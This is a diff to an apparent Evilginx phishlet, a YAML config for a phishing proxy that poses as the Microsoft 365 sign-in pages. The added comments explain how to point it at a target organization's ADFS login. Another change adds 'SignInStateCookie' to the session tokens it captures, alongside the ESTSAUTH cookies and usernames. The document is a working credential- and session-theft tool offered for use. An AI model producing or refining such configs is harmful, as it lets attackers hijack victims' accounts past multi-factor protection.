@@ -4,6 +4,13 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  # The ones below are needed if your target organization utilizes ADFS.
+  # If they do not, you can comment out all lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
   - {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
   - {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
 sub_filters:
@@ -13,6 +20,8 @@ sub_filters:
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']
 credentials:
   username:
     key: '(login|UserName)'
